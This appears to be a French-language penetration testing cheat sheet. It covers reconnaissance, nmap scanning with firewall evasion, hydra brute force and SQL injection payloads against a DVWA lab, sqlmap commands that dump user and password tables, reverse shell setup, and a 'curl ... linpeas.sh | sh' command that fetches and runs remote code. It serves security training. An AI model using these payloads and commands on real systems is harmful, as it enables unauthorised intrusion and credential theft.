<p align="center">
  Pentest-Cheat-Sheet<br>
</p>

##[RECONNAISSANCE PASSIVE / OSINT:]

      Enumeration DNS:
        Lookup WHOIS record	whois tryhackme.com
        Lookup DNS A records	nslookup -type=A tryhackme.com
        Lookup DNS MX records at DNS server	nslookup -type=MX tryhackme.com 1.1.1.1
        Lookup DNS TXT records	nslookup -type=TXT tryhackme.com
        Lookup DNS A records	dig tryhackme.com A
        Lookup DNS MX records at DNS server	dig @1.1.1.1 tryhackme.com MX
        Lookup DNS TXT records	dig tryhackme.com TXT

      dnsdumpster.com
      
      https://github.com/cipher387/osint_stuff_tool_collection

      dnsdumpster (#https://dnsdumpster.com/)
      
      spiderfoot (https://github.com/smicallef/spiderfoot)
      
      Qualys SSL LABS (https://www.ssllabs.com/)
      
      Wappalyzer plugin navigateur (caching = banner grabbing)
      
      Flagfox plugin nav
      
      Hunter.io plugin nav
      
      Omega switch plugin nav
      
      Port Checker plugin
      
      webdevelopper plugin
      
      hackbar plugin pour F12
      
      hacktools plugin ( a recuperer sur github)
      
      copyfish OCR
      
      download all images
      
      ghostery tracker Ad BLOCKER
      
      GHUNT !!!!!
      
      hack-tools
      
      LeakIX
      
      Netlas.IO
      
      LinkGopher
      
      Search by image
      
      aperisolv (https://www.aperisolve.com/)
      
      https://www.lemondeinformatique.fr/actualites/lire-8-outils-osint-pour-le-cyber-renseignement-80484.html

      pentestertools




##[RECONNAISSANCE ACTICE / ENUMERATION]

    -sudo netdiscover -r 192.168. -i eth0
    (eliminer les mac vmware workstation)
    
    -ping de l'adresse trouvée pour vérifier si ping up 
      vérifier le TTL pour trouver si linux ou windows:
        Unix / Linux – 0-64
        Windows – 65-127
        Cisco/Solaris/AIX – 128-265
        
    nmap -n -vvv -Pn -O -sV 192.x.x.x -oX fichier.xml
      -n = NO DNS resolution 
      -vvv = full verbose
      -Pn = port scan only, no ping
      -O = OS scan fingerprinting
      -sV = Banner Grabbing
      -oX = export de fichier en xml

      nmap -sC -sV -p- -T4 --min-rate=9326 -vv
        sC : run particular scripts on the target and check what all can happen there
        sV : check for the versions
        -p- : check all the ports
        -T4 : it is to speed up things(max is T5)
        — min-rate=9326 : nmap will send the packets at the rate of 9326 per second, this 9326 is just a random number that I got from my Twitter friend
        -vv this stand for very verbose(refers to details) output

    xsltproc fichier.xml -o fichier.html
      transforme l'export xml en html
      
    nmap -sV -O 192.168xx -vvv
      banner grabbing + reconnaissance d'OS si besoin

    IDS / Firewall evasion
        nmap -f 
          fragmente les paquets
          
        sudo nmap --script path-mtu 192.168.x.x (donne le path-mtu)
        nmap ....... -mtu (32,64...)
        
        nmap -data-length 200 192.168.x.x
            change la taille des paquets
    
    nmap --script=http-robot.txt 192.168xx -vvv
        location des scripts NSE (nmap script engine) locate *.nse
    ls /usr/share/nmap/scripts/ | grep ftp 
        pour trouver un script NSE dans l'emplacement des scripts
        
    nmap -sV -script http-sql-injection 192.168.x.x
        Scan des injections sql
        
##[CRAWLING]    

    -gobuster
      premiere indexation de repertoires
      cheatsheet = https://linuxcscom.wordpress.com/gobuster/
      
    -dirb http:// 
      juste pour indexer les repertoires
      
    -nikto -host http://192.168..
      recherche de repertoires
      reconnaisance de vulnerabilites
      rechercher dans l'OSVDB
      (https://cdn.comparitech.com/wp-content/uploads/2019/07/NIkto-Cheat-Sheet.pdf)
      
    -Zaproxy (https://github.com/zaproxy/zaproxy)
      webapp scanner
      taper zaproxy puis y pour installer ou apt install zaproxy
      ajouter ajax spider
      ajouter fuzz
      
    -burp

      Proxy pour intercepter (ma requete, mo,n formulailre etc)
      
      Intruder : mode sniper = attaquer un seul champ
                 mode cluster bomb = attaquer plusieurs champs
                 Battering ram = surcharger la ram
                 mode PitchFork = noyer le cluster avec plusieurs payload

                 Add $ (variable) = à poser sur chaque variable que l'on veut bruterforcer, puis dans payloads cela       
                 deviendra ma variable
                 je choisis ensuite mon payload (payload 1 correspond à ma première variable)
                 Dans mon payload settings je vais choisir ma wordlist
                 Je coche ou decoche l'url encodage selon si mes champs de depart sont encodés ou non
                 Je fais pareil pour ma deuxieme variable (mdp par exemple)
                 Je desactive le proxy
                 et je lance mon attaque
                 

    
#[INJECTIONS WEB]


      Brute force
        Avec hydra :
        hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://192.168.46.141/DVWA-master/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=of7vk530l9s8e7rph9oac52923;            security=medium:F=Username and/or password incorrect'      
        -l pour le user (-L si wordlist de user)
        -P wordlist de password (-p password statique)
        'http-getform: urlduformulaire : password et mdp : H=cookie de session:F= reponse en cas de bad user pwd'
    
      Inection XSS : 
        xsshunter https://github.com/mandatoryprogrammer/xsshunter-express
        Beef autopown (https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine)
        
      Injections SQL
        1' or 1=1; --  (pour obtenir tout les records dans la table)
        ' OR 1=1 #
        1' OR '1'='1'# (pour obtenir tout les records dans la table)
       
        Si le #, 99% de chance que le DBMS soit MySQL ou un fork (mariadb etc)
        Si# ok:
        %' or 0=0 union select null, version() # ( connaitre la version de database) ou 1' OR 1=1 UNION SELECT 1, VERSION()#
        1' OR 1=1 UNION SELECT 1,DATABASE() # (connaitre le nom de la DB)
        Utiliser order by pour connaitre le nombre de champ:
            1' ORDER BY 1 #
            1' ORDER BY 2 # etc jusqu'a avoir l'erreur
            Si erreur à 3 = 2champs
            Si erreur à 4 = 3champs etc
        1' OR 1=1 UNION SELECT 1, VERSION()#
        1' OR 1=1 UNION SELECT 1, DATABASE()#
        1' OR 1=1 UNION SELECT  1, table_name FROM information_schema.tables #
        1' OR 1=1 UNION SELECT  1, column_name FROM information_schema.columns  #
        1' OR 1=1 UNION SELECT user, password FROM users(nom de la table) #
        
        SQLMAP
        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --dbs --banner --current-user --current-db --passwords --users
          •	L’argument --dbs pour énumérer le nom des bases de données
          •	L’argument --banner pour afficher la version de base de données
          •	L’argument --current-user pour afficher l’utilisateur connecté au système de gestion de base de données
          •	L’argument --current-db pour afficher la base de données de gestion du système de gestion de base de données
          •	L’argument --users pour afficher le ou les utilisateurs connectés au système de gestion de base de données
          •	L’argument --passwords pour obtenir les hash du mot de passe du ou des utilisateurs connectés au système de gestion de base de données. Cet argument va également essayer de cracker le has des mots de passe.


        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --tables -D dvwa
          •	L’argument -D dvwa pour sélectionner la base de données dvwa
          •	L’argument --tables pour afficher les tables dans cette base


        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" -p id -T users --batch --threads 5 –dump
          •	L’argument -p pour sélectionner le paramètre testable
          •	L’argument -T pour sélectionner la table
          •	L’argument --batch pour éviter de devoir répondre aux questions avec y ou n
          •	L’argument -threads pour limiter le nombre de requêtes http simultanées à 5
          •	L’argument --dump pour afficher les entrées de la table


        https://github.com/sqlmapproject/sqlmap/wiki/Usage (MEILLEUR DES CHEATSHEET)
        https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap CHEATSHEET EXPLICATIVE !!!
        Cheatsheet https://portswigger.net/web-security/sql-injection/cheat-sheet
        https://book.hacktricks.xyz/pentesting-web/sql-injection

       File upload en jpg/png :
         modifier Content-type vers /image/png
         https://wargame.braincoke.fr/labs/dvwa/dvwa-file-upload/
         tout les content type : https://inkplant.com/code/content-type-headers

        

#[SHELL / REVERSE SHELL]

    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    https://github.com/flozz/p0wny-shell

    nc -lnvp 4444
      -l pour démarrer l’écoute des connexions TCP
      -n pour empêcher les résolutions DNS sur l’ip d’écoute
      -v pour obtenir des résultats détaillés
      -p pour lui indiquer le port d’écoute renseigné dans mon reverse shell (4444)

    stabiliser shell python :
      python -c 'import pty;pty.spawn("/bin/bash");'
      python -c 'import pty; pty.spawn("/bin/bash")'
      ctrl + z pour mettre le shell en background
      stty raw -echo  (desactive l'echo)
      fg  (pour remettre le shell en foreground)            
      ENTER
      ENTER
      export TERM=xterm     (pour defininir la variable du shell sur xterm)
      stty cols 132 rows 34  (pour definir le nombre de ligne et colonnes du terminal)

      
https://github.com/flozz/p0wny-shell

#[PRIVESC]   

    sudo -l pour voir qqchose executable en root
    
    Linpeas pour enum les gtfobins
      SE METTRE DANS LE TMP
      curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
      wget 

    gtfobins
      https://gtfobins.github.io/

#[WORDLISTS]

    apt -y install seclists (https://github.com/danielmiessler/SecLists)

#[COMMANDES UTILES]

    x-www-browser index.html
      Pour ouvrir un fichier html en ligne de commande

#[SITES UTILES]
    
    Wordpress sécurisation:
      wpmarmite (https://wpmarmite.com/)

    MD5 Decrypt
      https://www.dcode.fr/md5-hash

    Hash identifier
      https://hashes.com/en/tools/hash_identifier

    Générateur d'incident cyber 
      https://github.com/mrwadams/attackgen

    Honeypot ALLINONE teaspot
      (https://github.com/github-rashelbach/-T-Pot-Honeypot) = honeypot all in one

    Github rapport pentest
      https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
      https://github.com/cyber-cfreg/Penetration-Test-Report-Template




